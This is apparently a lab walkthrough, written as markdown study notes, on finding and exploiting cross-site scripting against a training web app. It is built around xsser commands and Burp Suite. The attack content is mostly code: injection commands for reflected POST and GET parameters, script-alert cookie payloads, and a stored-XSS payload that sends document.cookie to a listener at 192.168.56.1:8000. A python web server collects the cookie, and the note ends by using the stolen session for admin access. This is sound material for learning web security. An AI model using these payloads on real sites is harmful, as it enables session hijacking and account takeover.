# XSS

Webpage could be susceptible to XSS attacks if user input is reflected back onto the page<br>
Use xsser to check for these vulnerabilities

## Reflected

Input is outputted onto webpage

### POST Request

Submit query and intercept with Burp Suite<br>
![1.1](./imgs/1.1.png)

Pass to xsser to check for XSS vuln<br>
- Change target parameter value to "XSS" so xsser knows which parameter to inject payload
-p=POSTDATA
```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

Try different payloads
```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
```

Add your own custom parameter<br>
-Fp=FINAL_PAYLOAD
```
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(document.cookie)</script>"
```

Change payload in Burp Suite

![1.2](./imgs/1.2.png)

![1.3](./imgs/1.3.png)

![1.4](./imgs/1.4.png)


### GET Request

Check for XSS vuln
![2.1](./imgs/2.1.png)
```
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=ark&user-poll-php-submit-button=Submit+Vote"
```
![2.2](./imgs/2.2.png)

Try different payloads<br>
-Fp=FINAL_PAYLOAD
```
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=ark&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(document.cookie)</script>"
```

![2.3](./imgs/2.3.png)

![2.4](./imgs/2.4.png)

## Persistent

Input is permanently stored in the webpage's database

Write blog post script that will display the user's cookie
```
<h1 id=cookie-tag></h1><script>document.getElementById("cookie-tag").innerHTML = document.cookie</script>
```

![3.1](./imgs/3.1.png)

![3.2](./imgs/3.2.png)

Now lets inject a script that will steal cookies

```
<script>document.location="http://192.168.56.1:8000/?cookie=" + document.cookie</script>
```

Start webserver on port 8000
```
python3 -m http.server
```

![3.3](./imgs/3.3.png)

Use the stolen cookie to get admin access
![3.4](./imgs/3.4.png)
